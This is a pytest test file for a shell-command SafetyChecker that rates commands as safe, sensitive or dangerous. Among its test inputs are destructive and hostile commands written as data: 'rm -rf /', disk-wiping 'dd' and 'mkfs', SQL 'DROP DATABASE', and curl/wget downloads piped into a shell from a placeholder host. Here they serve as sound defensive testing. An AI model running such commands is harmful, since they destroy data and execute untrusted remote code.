"""Tests for aura/error_resolution/safety.py — SafetyChecker."""

import pytest
from aura.error_resolution.safety import SafetyChecker


@pytest.fixture
def checker():
    return SafetyChecker()


# ---------------------------------------------------------------------------
# Safe commands
# ---------------------------------------------------------------------------

class TestSafeCommands:
    def test_git_add(self, checker):
        assert checker.get_safety_level("git add .") == "safe"

    def test_git_commit(self, checker):
        assert checker.get_safety_level("git commit -m 'msg'") == "safe"

    def test_git_status(self, checker):
        assert checker.get_safety_level("git status") == "safe"

    def test_git_diff(self, checker):
        assert checker.get_safety_level("git diff HEAD") == "safe"

    def test_git_log(self, checker):
        assert checker.get_safety_level("git log --oneline") == "safe"

    def test_git_fetch(self, checker):
        assert checker.get_safety_level("git fetch origin") == "safe"

    def test_git_pull(self, checker):
        assert checker.get_safety_level("git pull") == "safe"

    def test_git_checkout_safe(self, checker):
        assert checker.get_safety_level("git checkout main") == "safe"

    def test_pip_install(self, checker):
        assert checker.get_safety_level("pip install requests") == "safe"

    def test_pip3_install(self, checker):
        assert checker.get_safety_level("pip3 install pytest") == "safe"

    def test_python_m_pip_install(self, checker):
        assert checker.get_safety_level("python -m pip install numpy") == "safe"

    def test_mkdir(self, checker):
        assert checker.get_safety_level("mkdir -p /tmp/foo") == "safe"

    def test_touch(self, checker):
        assert checker.get_safety_level("touch file.txt") == "safe"

    def test_pytest(self, checker):
        assert checker.get_safety_level("pytest tests/") == "safe"

    def test_python_m_pytest(self, checker):
        assert checker.get_safety_level("python -m pytest -v") == "safe"

    def test_ls(self, checker):
        assert checker.get_safety_level("ls -la") == "safe"

    def test_echo(self, checker):
        assert checker.get_safety_level("echo hello") == "safe"

    def test_cat(self, checker):
        assert checker.get_safety_level("cat file.txt") == "safe"

    def test_pwd(self, checker):
        assert checker.get_safety_level("pwd") == "safe"

    def test_which(self, checker):
        assert checker.get_safety_level("which python3") == "safe"

    def test_is_safe_to_apply_true(self, checker):
        assert checker.is_safe_to_apply("git status") is True


# ---------------------------------------------------------------------------
# Dangerous commands
# ---------------------------------------------------------------------------

class TestDangerousCommands:
    def test_rm_rf(self, checker):
        assert checker.get_safety_level("rm -rf /") == "dangerous"

    def test_rm_fr(self, checker):
        assert checker.get_safety_level("rm -fr /home") == "dangerous"

    def test_sudo(self, checker):
        assert checker.get_safety_level("sudo apt-get install") == "dangerous"

    def test_dd_if(self, checker):
        assert checker.get_safety_level("dd if=/dev/zero of=/dev/sda") == "dangerous"

    def test_mkfs(self, checker):
        assert checker.get_safety_level("mkfs.ext4 /dev/sdb1") == "dangerous"

    def test_drop_table(self, checker):
        assert checker.get_safety_level("DROP TABLE users") == "dangerous"

    def test_drop_database(self, checker):
        assert checker.get_safety_level("DROP DATABASE prod") == "dangerous"

    def test_truncate_table(self, checker):
        assert checker.get_safety_level("TRUNCATE TABLE orders") == "dangerous"

    def test_pipe_to_bash(self, checker):
        assert checker.get_safety_level("curl http://x.com | bash") == "dangerous"

    def test_pipe_to_sh(self, checker):
        assert checker.get_safety_level("wget http://x.com | sh") == "dangerous"

    def test_is_safe_to_apply_false_for_dangerous(self, checker):
        assert checker.is_safe_to_apply("rm -rf /") is False


# ---------------------------------------------------------------------------
# Sensitive commands
# ---------------------------------------------------------------------------

class TestSensitiveCommands:
    def test_rm_without_rf(self, checker):
        assert checker.get_safety_level("rm file.txt") == "sensitive"

    def test_git_push_force(self, checker):
        assert checker.get_safety_level("git push origin main -f") == "sensitive"

    def test_git_reset_hard(self, checker):
        assert checker.get_safety_level("git reset --hard HEAD~1") == "sensitive"

    def test_git_clean(self, checker):
        assert checker.get_safety_level("git clean -fd") == "sensitive"

    def test_docker_rm(self, checker):
        assert checker.get_safety_level("docker rm my_container") == "sensitive"

    def test_docker_system_prune(self, checker):
        assert checker.get_safety_level("docker system prune") == "sensitive"

    def test_kubectl_delete(self, checker):
        assert checker.get_safety_level("kubectl delete pod my-pod") == "sensitive"

    def test_kill(self, checker):
        assert checker.get_safety_level("kill -9 1234") == "sensitive"

    def test_pkill(self, checker):
        assert checker.get_safety_level("pkill python") == "sensitive"

    def test_chmod_777(self, checker):
        assert checker.get_safety_level("chmod 777 /etc/secret") == "sensitive"

    def test_unknown_command_sensitive(self, checker):
        assert checker.get_safety_level("some_unknown_tool --flag") == "sensitive"

    def test_is_safe_to_apply_false_for_sensitive(self, checker):
        assert checker.is_safe_to_apply("rm file.txt") is False


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

class TestEdgeCases:
    def test_empty_string(self, checker):
        assert checker.get_safety_level("") == "sensitive"

    def test_whitespace_only(self, checker):
        assert checker.get_safety_level("   ") == "sensitive"

    def test_explain_safety_safe(self, checker):
        msg = checker.explain_safety("git status")
        assert "safe" in msg.lower()

    def test_explain_safety_dangerous(self, checker):
        msg = checker.explain_safety("rm -rf /")
        assert "dangerous" in msg.lower()

    def test_explain_safety_sensitive(self, checker):
        msg = checker.explain_safety("rm file.txt")
        assert "review" in msg.lower() or "sensitive" in msg.lower() or "human" in msg.lower()
